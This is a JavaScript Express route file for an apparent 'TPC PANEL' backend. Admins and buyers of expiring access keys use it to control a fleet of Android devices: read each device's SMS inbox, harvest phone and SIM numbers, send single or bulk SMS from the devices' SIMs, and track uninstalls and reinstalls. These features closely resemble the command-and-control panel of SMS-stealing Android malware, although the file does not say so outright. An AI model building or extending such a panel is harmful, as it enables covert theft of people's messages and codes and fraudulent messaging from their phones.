"use strict";

const express = require("express");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const auth = require("../auth");
const relay = require("../relay");
const bot = require("../bot");

const keysRouter = require("../admin/keys");
const adminsRouter = require("../admin/admins");
const rulesRouter = require("../admin/rules");
const growthRouter = require("../admin/growth");
const autoSenderRouter = require("../admin/autoSender");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

const ALLOWED_COMMANDS = new Set([
  "ping",
  "wake",
  "fetch_number",
  "number",
  "sim_info",
  "refresh_telemetry",
  "telemetry",
  "sync_inbox",
  "reload_config",
]);

// ---------------------------------------------------------------- auth

async function authStatus(req, res) {
  const ident = (req.session && req.session.adminId) || auth.bearerIdentity(req);
  if (!ident) return res.json({ authenticated: false });

  const [role, name] = auth.splitIdent(ident);

  if (role === "admin") {
    const admin = await auth.resolveAdmin(name);
    if (!admin) return res.json({ authenticated: false, role: "admin", reason: "unknown" });
    return res.json({
      authenticated: true,
      admin_id: admin.username,
      role: "admin",
      username: admin.username,
      expires_at: null,
      secret_source: config.SESSION_SECRET_SRC,
    });
  }

  const doc = await u.keyDoc(name);
  if (!doc || !u.keyActive(doc)) {
    return res.json({ authenticated: false, role: "key", reason: doc ? "expired" : "missing" });
  }
  res.json({
    authenticated: true,
    admin_id: doc.key || name,
    role: "key",
    username: doc.key || name,
    owner_key_id: String(doc._id),
    expires_at: u.serializeDt(doc.expires_at),
    secret_source: config.SESSION_SECRET_SRC,
  });
}

router.get("/admin/auth/status", ah(authStatus));
router.get("/panel/me", ah(authStatus));

router.post("/panel/login", ah(async (req, res) => {
  const ip = req.ip || "?";
  auth.loginThrottle(ip);

  const b = req.body || {};
  const user = String(b.login_id || b.username || "").trim();
  const pass = String(b.password || "");
  if (!user) throw new u.HttpError(400, "Login ID required");

  const admin = await auth.resolveAdmin(user);
  if (!admin || !auth.verifyAdminPassword(admin, pass)) {
    auth.pushFail(ip);
    throw new u.HttpError(401, "Invalid Login ID or password");
  }

  auth.clearFails(ip);
  const ident = `admin:${admin.username}`;

  const otp = await auth.startOtp(ident, admin.telegram_chat_id, `admin ${admin.username}`);
  if (otp) {
    return res.json({ status: "otp_required", role: "admin", ...otp });
  }

  await auth.completeLogin(req, ident, admin, ip);
  res.json(auth.loginPayload(ident, "admin", admin.username, null));
}));

router.post("/panel/access", ah(async (req, res) => {
  const ip = req.ip || "?";
  auth.loginThrottle(ip);

  const b = req.body || {};
  const k = u.normalizeKey(b.key);
  const pass = String(b.password || "");
  if (k.length < 8) throw new u.HttpError(400, "Key daalo (TPC-XXXX-XXXX-XXXX)");

  const doc = await u.keyDoc(k);
  if (!doc) {
    auth.pushFail(ip);
    throw new u.HttpError(401, "Key galat hai");
  }
  if (doc.blocked) throw new u.HttpError(403, "Key block hai — admin se baat karo");
  if (doc.expires_at instanceof Date && doc.expires_at.getTime() <= Date.now()) {
    throw new u.HttpError(403, "Key expire ho gayi — admin se renew karvao");
  }
  if (!doc.password_hash) {
    throw new u.HttpError(403, "Is key par password set nahi — admin se reset karvao");
  }
  if (!u.verifyPassword(pass, doc.password_hash)) {
    auth.pushFail(ip);
    throw new u.HttpError(401, "Password galat hai");
  }

  auth.clearFails(ip);
  const ident = `key:${doc.key || k}`;

  const otp = await auth.startOtp(ident, doc.telegram_chat_id, doc.label || doc.key);
  if (otp) {
    return res.json({ status: "otp_required", role: "key", ...otp });
  }

  await auth.completeLogin(req, ident, doc, ip);
  res.json(auth.loginPayload(ident, "key", doc.key, doc.expires_at));
}));

router.post("/panel/otp/verify", ah(async (req, res) => {
  const ip = req.ip || "?";
  auth.loginThrottle(ip);

  const b = req.body || {};
  const ident = await auth.verifyOtp(b.challenge, b.code);
  auth.clearFails(ip);

  const [role, name] = auth.splitIdent(ident);

  if (role === "admin") {
    const admin = await auth.resolveAdmin(name);
    if (!admin) throw new u.HttpError(401, "Admin not found");
    await auth.completeLogin(req, ident, admin, ip);
    return res.json(auth.loginPayload(ident, "admin", admin.username, null));
  }

  const doc = await u.keyDoc(name);
  if (!doc || !u.keyActive(doc)) throw new u.HttpError(403, "Key invalid ho gayi");

  await auth.completeLogin(req, ident, doc, ip);
  res.json(auth.loginPayload(ident, "key", doc.key, doc.expires_at));
}));

router.post("/panel/otp/resend", ah(async (req, res) => {
  const r = await auth.resendOtp((req.body || {}).challenge);
  res.json({ status: "ok", ...r });
}));

router.post("/admin/logout", ah(async (req, res) => {
  const ident = (req.session && req.session.adminId) || auth.bearerIdentity(req);
  if (ident) u.logEvent("logout", { ident });
  req.session = null;
  res.json({ status: "ok" });
}));

router.get("/admin/session", ah(async (req, res) => {
  const ident = await auth.requirePanel(req);
  res.json({
    admin_id: ident.name,
    role: ident.role,
    via: req.session && req.session.adminId ? "session" : "token",
    secret_source: config.SESSION_SECRET_SRC,
  });
}));

// ------------------------------------------------------------- bot status

router.get("/admin/bot/status", ah(async (req, res) => {
  await auth.requirePanel(req);
  res.json(await bot.status());
}));

router.post("/admin/bot/test", ah(async (req, res) => {
  const me = await auth.requirePanel(req);
  const ident = (req.session && req.session.adminId) || auth.bearerIdentity(req);
  const [role, name] = auth.splitIdent(ident || "");

  let chat = null;
  if (role === "key") {
    const doc = await u.keyDoc(name);
    chat = doc && doc.telegram_chat_id;
  } else {
    const admin = await auth.resolveAdmin(name);
    chat = admin && admin.telegram_chat_id;
  }

  if (!chat) throw new u.HttpError(400, "Is account par Telegram linked nahi hai");
  const ok = await bot.sendMessage(chat, "🔔 TPC PANEL test notification — sab theek hai.");
  if (!ok) throw new u.HttpError(502, "Message nahi gaya");
  u.logEvent("bot_test", { to: chat }, null, me.name);
  res.json({ status: "ok" });
}));

// ---------------------------------------------------------------- sub-routers

router.use("/admin/admins", adminsRouter);
router.use("/admin", autoSenderRouter);
router.use("/admin", growthRouter);
router.use("/admin/keys", keysRouter);
router.use("/admin/users", keysRouter);
router.use("/admin/rules", rulesRouter);

// ---------------------------------------------------------------- devices

async function ownerLabels(rows) {
  const ids = [...new Set(rows.map((r) => r.owner_key_id).filter(Boolean).map(String))];
  if (!ids.length) return new Map();
  const map = new Map();
  const docs = await db.panel_keys
    .find({ _id: { $in: ids.map((i) => { try { return new db.ObjectId(i); } catch (_) { return null; } }).filter(Boolean) } },
      { projection: { key: 1, label: 1 } })
    .toArray()
    .catch(() => []);
  for (const d of docs) map.set(String(d._id), d.label || d.key || "");
  return map;
}

router.get("/admin/devices", ah(async (req, res) => {
  const ident = await auth.requirePanelOrKey(req);
  const q = { ...u.ownerFilter(ident) };
  if (req.query.onboarded !== undefined) q.onboarded = req.query.onboarded === "true";

  const now = Date.now();
  const state = String(req.query.state || "");
  if (state === "live") {
    q.last_seen = { $gte: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000) };
  } else if (state === "idle") {
    q.last_seen = {
      $lt: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000),
      $gte: new Date(now - config.IDLE_AFTER_HOURS * 3600000),
    };
  } else if (state === "stale") {
    q.last_seen = {
      $lt: new Date(now - config.IDLE_AFTER_HOURS * 3600000),
      $gte: new Date(now - config.STALE_AFTER_DAYS * 86400000),
    };
  } else if (state === "uninstalled") {
    q.last_seen = { $lt: new Date(now - config.STALE_AFTER_DAYS * 86400000) };
  } else if (state === "gone") {
    q.install_state = "gone";
  } else if (state === "reinstall") {
    q.install_seq = { $gt: 1 };
  }

  if (req.query.q && String(req.query.q).trim()) {
    const rx = new RegExp(String(req.query.q).trim().replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
    q.$or = [
      { device_name: rx },
      { short_id: rx },
      { phone_number: rx },
      { "telemetry.sim_number": rx },
      { android_id: rx },
    ];
  }

  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 300, 10), 1000));
  const rows = await db.devices
    .find(q, { projection: { registration_id_hash: 0 } })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();

  const labels = await ownerLabels(rows);
  res.json({
    devices: rows.map((d) => u.viewDevice({ ...d, owner_label: labels.get(String(d.owner_key_id)) || "" })),
    online_sockets: hub.hub.onlineCount,
  });
}));

async function deviceScoped(req) {
  const ident = await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  u.assertDeviceAccess(device, ident);
  return { ident, device };
}

router.get("/admin/devices/:device_id", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  res.json(u.viewDevice(device));
}));

router.get("/admin/devices/:device_id/messages", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 500, 10), 1000));
  const rows = await db.messages
    .find({ device_id: String(device._id) })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();
  res.json({ messages: rows.map(u.serializeDocument) });
}));

router.get("/admin/devices/:device_id/events", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 100, 10), 500));
  const rows = await db.device_events
    .find({ device_id: String(device._id) })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();
  res.json({ events: rows.map(u.serializeDocument) });
}));

async function sendCommandTo(device, action) {
  const did = String(device._id);
  const online = hub.hub.online(did);
  const delivered = online ? await hub.sendCommand(did, action) : false;
  if (["fetch_number", "number", "sim_info", "refresh_telemetry"].includes(action)) {
    await db.devices
      .updateOne({ _id: device._id }, { $set: { number_requested_at: db.utcNow() } })
      .catch(() => {});
  }
  u.logEvent("device_command", { action, delivered, online }, did);
  return { online, delivered };
}

router.post("/admin/devices/:device_id/command", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  let action = String((req.body || {}).action || "ping").trim().toLowerCase();
  if (!ALLOWED_COMMANDS.has(action)) action = "ping";

  const { online, delivered } = await sendCommandTo(device, action);
  res.json({
    status: "ok",
    action,
    online,
    delivered,
    note: delivered ? "" : "device socket offline — online hone par apne aap milega",
  });
}));

router.post("/admin/devices/:device_id/refresh", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  const { online, delivered } = await sendCommandTo(device, "refresh_telemetry");
  res.json({ status: "ok", online, delivered, action: "refresh_telemetry" });
}));

router.post("/admin/devices/:device_id/ping", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  const online = hub.hub.online(String(device._id));
  const delivered = online ? await hub.sendCommand(String(device._id), "ping") : false;
  res.json({ status: "ok", online, delivered });
}));

router.post("/admin/devices/:device_id/wake", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  const online = hub.hub.online(String(device._id));
  const delivered = online ? await hub.sendCommand(String(device._id), "wake") : false;
  res.json({ status: "ok", online, delivered });
}));

router.post("/admin/devices/:device_id/rename", ah(async (req, res) => {
  const { ident, device } = await deviceScoped(req);
  const name = String((req.body || {}).device_name || "").trim().slice(0, 60);
  if (!name) throw new u.HttpError(400, "device_name required");

  await db.devices.updateOne({ _id: device._id }, { $set: { device_name: name } });
  hub.broadcastDevice(String(device._id), { device_name: name });
  u.logEvent("device_rename", { device_name: name }, String(device._id), ident.name);

  res.json({ status: "ok", device_name: name });
}));

router.delete("/admin/devices/:device_id", ah(async (req, res) => {
  const { ident, device } = await deviceScoped(req);
  const did = String(device._id);

  await Promise.all([
    db.messages.deleteMany({ device_id: did }).catch(() => {}),
    db.outbox.deleteMany({ device_id: did }).catch(() => {}),
    db.device_events.deleteMany({ device_id: did }).catch(() => {}),
  ]);
  await db.devices.deleteOne({ _id: device._id });
  hub.broadcastDevice(did, { deleted: true });
  u.logEvent("device_deleted", { short_id: u.deviceShortId(device) }, did, ident.name);

  res.json({ status: "ok" });
}));

// ------------------------------------------------------------------ send

router.post("/admin/send", ah(async (req, res) => {
  const ident = await auth.requirePanelOrKey(req);
  const b = req.body || {};
  const body = String(b.body || "").trim().slice(0, config.MAX_SMS_BODY);
  if (!body) throw new u.HttpError(400, "Message body required");

  if (b.device_id) {
    const dev = await u.getDeviceOr404(b.device_id);
    u.assertDeviceAccess(dev, ident);
  }

  const [targets, capped] = await hub.resolveTargets(
    { target: b.target || "all", device_id: b.device_id },
    ident.role === "admin" ? null : String(ident.owner_key_id)
  );

  if (!targets.length) {
    return res.json({ status: "ok", queued: 0, delivered: 0, results: [], note: "koi device match nahi hua" });
  }

  const manualTo = u.normalizeNumber(b.to);
  const results = [];

  for (const device of targets) {
    const deviceId = String(device._id);
    const to = manualTo || u.resolveDeviceNumber(device);
    const slots = hub.slotsFor(b.sim_slots, device);
    let delivered = false;

    for (const slot of slots) {
      const [outboxId] = await hub.queueSms(
        deviceId, body, to, "panel", device.device_name || "Unknown", slot
      );
      if (hub.hub.online(deviceId) && (await hub.deliverOutboxRow(deviceId, outboxId))) {
        delivered = true;
      }
    }

    results.push({
      device_id: deviceId,
      device_name: device.device_name || "Unknown",
      short_id: u.deviceShortId(device),
      to,
      slots,
      delivered,
      queued: true,
    });
  }

  const deliveredN = results.filter((r) => r.delivered).length;
  u.logEvent(
    "bulk_send",
    { target: b.target, queued: results.length, delivered: deliveredN, slots: b.sim_slots },
    null,
    ident.name
  );

  const notes = [];
  if (deliveredN < results.length) notes.push("kuch device offline hain — SMS outbox me queue hai");
  if (Array.isArray(b.sim_slots) && b.sim_slots.length) {
    notes.push("selected SIMs: " + b.sim_slots.map((s) => `SIM ${Number(s) + 1}`).join(", "));
  }
  if (capped) notes.push(`fleet ${config.MAX_BROADCAST} se bada hai — sirf pehle ${config.MAX_BROADCAST}`);

  res.json({ status: "ok", queued: results.length, delivered: deliveredN, capped, results, note: notes.join(" | ") });
}));

router.post("/admin/devices/:device_id/sms", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  const b = req.body || {};
  const body = String(b.body || b.message || "").trim().slice(0, config.MAX_SMS_BODY);
  if (!body) throw new u.HttpError(400, "Message body required");

  const deviceId = String(device._id);
  const to = u.normalizeNumber(b.to) || u.resolveDeviceNumber(device);
  const slots = hub.slotsFor(b.sim_slots, device);
  let delivered = false;

  for (const s of slots) {
    const [outboxId] = await hub.queueSms(deviceId, body, to, "panel", device.device_name || "", s);
    if (hub.hub.online(deviceId) && (await hub.deliverOutboxRow(deviceId, outboxId))) delivered = true;
  }

  res.json({ status: "ok", queued: slots.length, to, slots, delivered });
}));

router.post("/admin/devices/:device_id/push-outbox", ah(async (req, res) => {
  const { device } = await deviceScoped(req);
  const did = String(device._id);

  if (!hub.hub.online(did)) {
    return res.json({ status: "ok", online: false, pushed: 0, note: "device offline" });
  }
  const n = await hub.pushOutbox(did);
  res.json({ status: "ok", online: true, pushed: n });
}));

router.get("/admin/messages", ah(async (req, res) => {
  const ident = await auth.requirePanelOrKey(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 200, 10), 1000));
  const q = {};

  const owned = await u.ownedDeviceIds(ident);
  if (owned) {
    if (!owned.length) return res.json({ messages: [] });
    q.device_id = { $in: owned };
  }
  if (["in", "out"].includes(String(req.query.direction))) q.direction = String(req.query.direction);
  if (req.query.device_id) q.device_id = String(req.query.device_id);
  if (req.query.kind) q.kind = String(req.query.kind);

  const rows = await db.messages.find(q).sort({ _id: -1 }).limit(limit).toArray();
  res.json({ messages: rows.map(u.serializeDocument) });
}));

router.get("/admin/activity", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 100, 10), 500));
  const rows = await db.activity_logs.find().sort({ _id: -1 }).limit(limit).toArray();
  res.json({ activity: rows.map(u.serializeDocument) });
}));

module.exports = router;